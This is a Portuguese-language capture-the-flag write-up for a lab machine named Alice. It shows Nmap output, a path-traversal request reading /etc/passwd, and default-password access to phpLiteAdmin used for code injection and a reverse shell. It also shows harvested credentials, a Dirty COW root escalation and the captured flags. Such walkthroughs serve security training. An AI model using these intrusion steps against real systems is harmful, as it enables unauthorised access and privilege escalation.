CyberCup - Alice

# CyberCup - Alice

## Enumeração

- Executado Nmap

  ```
  # Nmap 7.80 scan initiated Sun Jun 28 00:32:09 2020 as: nmap -sC -sV -Pn -oA quick 10.2.0.131
  Nmap scan report for 10.2.0.131
  Host is up (0.0022s latency).
  Not shown: 997 closed ports
  PORT    STATE SERVICE VERSION
  22/tcp  open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
  | ssh-hostkey: 
  |   1024 68:60:de:c2:2b:c6:16:d8:5b:88:be:e3:cc:a1:25:75 (DSA)
  |   2048 50:db:75:ba:11:2f:43:c9:ab:14:40:6d:7f:a1:ee:e3 (RSA)
  |_  256 11:5d:55:29:8a:77:d8:08:b4:00:9b:a3:61:93:fe:e5 (ECDSA)
  80/tcp  open  http    Apache httpd 2.2.22 ((Ubuntu))
  |_http-server-header: Apache/2.2.22 (Ubuntu)
  |_http-title: Alice's Shop
  111/tcp open  rpcbind 2-4 (RPC #100000)
  | rpcinfo: 
  |   program version    port/proto  service
  |   100000  2,3,4        111/tcp   rpcbind
  |   100000  2,3,4        111/udp   rpcbind
  |   100000  3,4          111/tcp6  rpcbind
  |   100000  3,4          111/udp6  rpcbind
  |   100024  1          45939/tcp   status
  |   100024  1          51196/tcp6  status
  |   100024  1          51294/udp   status
  |_  100024  1          53359/udp6  status
  Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
  
  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
  # Nmap done at Sun Jun 28 00:32:23 2020 -- 1 IP address (1 host up) scanned in 13.82 seconds
  
  ```

  ### 80/TCP

- Ao acessar a porta 80/TCP identificado que existe um website apache em execução. DUrante navegação notado que as urls poderiam ser vulneraveis à LFI, o que foi comprovado na requisição abaixo

  ```
  GET /view.php?page=../../etc/passwd HTTP/1.1
  Host: 10.2.0.131
  User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
  Accept-Language: en-US,en;q=0.5
  Accept-Encoding: gzip, deflate
  DNT: 1
  Connection: close
  Upgrade-Insecure-Requests: 1
  Pragma: no-cache
  Cache-Control: no-cache
  
  ```

- Ao tentar importar logs do apache como /var/log/apache2/access.log, dentre outros e obtido insucesso, verificado que nao seria possivel utilizar do LFI para obter RCE diretamente via log poisioning. 

- Ao dar continuidade, executado gobuster enumerando outros possíveis diretorios no servidor, o que encontrou a pasta dbadmin que executava a aplicação phpLiteAdmin v1.9.3, que permitiu acesso com a senha padrão **admin**, encontrada por dedução

  ```
  ----------------------------------------------------------------------------------- ---------------------------------
   Exploit Title                                                                     |  Path
  ----------------------------------------------------------------------------------- ---------------------------------
  phpLiteAdmin - 'table' SQL Injection                                               | php/webapps/38228.txt
  phpLiteAdmin 1.1 - Multiple Vulnerabilities                                        | php/webapps/37515.txt
  PHPLiteAdmin 1.9.3 - Remote PHP Code Injection                                     | php/webapps/24044.txt
  phpLiteAdmin 1.9.6 - Multiple Vulnerabilities                                      | php/webapps/39714.txt
  ----------------------------------------------------------------------------------- --------------------------------
  
  ```

- No phpLiteAdmin, executado procedimentos descritos em https://v3ded.github.io/ctf/zico2.html onde através de um valor padrão era obtido um shell reverso a partir de um payload publicado via http server local

- Através do shell reverso, obtido flag user.txt como o usuário **alice** na pasta /home/zico

```
www-data@shop:/home/zico$ cat user.txt 
j39d8ajeoc0paz63lmndr0wusa823nu7
www-data@shop:/home/zico$ 

```

- Executado comando para enumerar arquivos com permissão de leitura no diretorio /home. Notado que haviam arquivos de configuração do wordpress e joomla.


```

www-data@shop:/tmp$ find /home -type f -readable 2>/dev/null                                                         
/home/zico/bootstrap.zip                                                                                             
/home/zico/startbootstrap-business-casual-gh-pages/img/slide-1.jpg                                                   
/home/zico/startbootstrap-business-casual-gh-pages/img/slide-2.jpg                                                   
/home/zico/startbootstrap-business-casual-gh-pages/img/bg.jpg                                                        
/home/zico/startbootstrap-business-casual-gh-pages/img/intro-pic.jpg 
```

- Encontrado no arquivo de configuração **/home/zico/wordpress/wp-config.php** as credenciais de banco de dados do usuário **alice**, que eram tambem utilizadas para login com a conta no linux

  ```
  alice:fiap3raaz
  ```

- Ao enumerar, notado que maquina é vulnervel ao dirtycow. Executado exploit **40839** do exploitdb e logado como firefart, obtendo flag root.txt


```
firefart@shop:~# cat /root/root.txt                                                                                  │zurc@kali:/dcruz/fiap/cybercup/alice/exploit$ 
983jlie39ksc0aslemn3378ad0u                                                                                        
firefart@shop:~#           
```

